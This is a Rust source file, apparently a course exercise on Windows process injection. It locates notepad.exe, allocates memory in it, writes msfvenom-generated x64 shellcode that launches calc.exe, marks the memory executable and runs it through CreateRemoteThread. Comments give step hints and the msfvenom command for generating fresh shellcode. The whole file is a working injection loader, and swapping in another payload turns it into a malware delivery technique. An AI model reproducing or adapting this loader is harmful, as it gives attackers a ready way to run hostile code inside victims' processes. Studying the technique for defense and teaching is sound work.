use std::mem::transmute;
use std::os::raw::c_void;
use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VirtualAllocEx, VirtualProtectEx,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, INFINITE, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, WaitForSingleObject,
};

// Same x64 calc.exe shellcode from Module 01.
// Generate fresh with: msfvenom -p windows/x64/exec CMD=calc.exe -f rust
const SHELLCODE: &[u8] = &[0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
0x2e,0x65,0x78,0x65,0x00];

fn main() {
    // Parse PID from command-line argument: process-injection.exe <pid>
    /* 
    let pid: u32 = std::env::args()
        .nth(1)
        .expect("Usage: process-injection.exe <pid>")
        .parse()
        .expect("PID must be a number");
    */
    
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(
            TH32CS_SNAPPROCESS, 0
        ).ok().expect("Tool Helpfer failed");

        let mut entry = PROCESSENTRY32W {dwSize: size_of::<PROCESSENTRY32W>() as u32, ..Default::default()};
        Process32FirstW(
            snapshot,  
            &mut entry
        ).ok().expect("error with first process");

        let pid = loop {
            if String::from_utf16_lossy(&entry.szExeFile).trim_matches('\0') == "notepad.exe" {
                break entry.th32ProcessID;
            }
            Process32NextW(snapshot, &mut entry).ok().expect("notepad not running");
        };

        // Step 2 — Open the target process.
        // Hint: OpenProcess(access_rights, inherit_handle, pid) -> Result<HANDLE>
        //       You need PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD.
        let handle = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 
            false,
            pid
        ).ok().expect("Open Process failed");

        // Step 3 — Allocate RW memory inside the target process.
        // Hint: VirtualAllocEx(handle, None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        //       Returns *mut c_void, NULL on failure. This pointer is in the target's address space.
        let base = VirtualAllocEx(
            handle, 
            None, 
            SHELLCODE.len(), 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        );
        
        if base.is_null() {
            panic!("Virtual Allocate failed: {:?}", GetLastError());
        }

        // Step 4 — Write shellcode into the remote allocation.
        // Hint: WriteProcessMemory(handle, remote_ptr, local_ptr, size, None)
        //       Cast SHELLCODE.as_ptr() to *const c_void for the local buffer.
        WriteProcessMemory(
            handle,
            base as *const c_void, 
            SHELLCODE.as_ptr() as *const c_void, 
            SHELLCODE.len(), 
            None
        ).ok().expect("Write Process failed");

        // Step 5 — Flip remote memory protection to RX.
        // Hint: VirtualProtectEx — same as VirtualProtect but takes a process handle first.
        let mut old: PAGE_PROTECTION_FLAGS = Default::default();
        VirtualProtectEx(
            handle, 
            transmute(base), 
            SHELLCODE.len(), 
            PAGE_EXECUTE_READ, 
            &mut old // store old prot flags at default location
        ).ok().expect("Virtual Protect failed");

        // Step 6 — Create a remote thread at the shellcode address.
        // Hint: CreateRemoteThread(handle, None, 0, Some(transmute(remote_ptr)), None, 0, None)
        //       Then WaitForSingleObject(thread_handle, INFINITE).
        let threat = CreateRemoteThread(
            handle, 
            None, 
            0, 
            transmute(base), 
            None, 
            0u32, // why 0u32
            None
        ).ok().expect("Create Remote Threat failed");

        WaitForSingleObject(threat, INFINITE);
    }
}
